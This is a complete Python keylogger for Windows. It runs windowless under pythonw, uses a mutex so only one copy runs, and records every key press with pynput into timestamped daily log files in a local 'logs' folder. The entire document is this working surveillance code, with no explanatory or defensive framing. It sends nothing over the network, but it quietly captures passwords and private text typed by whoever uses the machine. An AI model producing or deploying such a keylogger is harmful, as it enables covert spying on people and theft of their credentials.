#Pythonw file. Do not run in Sublime Text or use print() statements to test code.
import logging, os, datetime, win32event, win32api, winerror
from pynput import keyboard

mutex = win32event.CreateMutex(None, 1, "mutex_var_xboz")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()

if not os.path.exists(os.path.join(os.getcwd(), "logs")):
    os.makedirs(os.path.join(os.getcwd(), "logs"))
log_dir = os.path.join(os.getcwd(), "logs")

logging.basicConfig(filename=(os.path.join(log_dir, datetime.datetime.now().strftime("%Y-%m-%d") + ".txt")), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(key)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
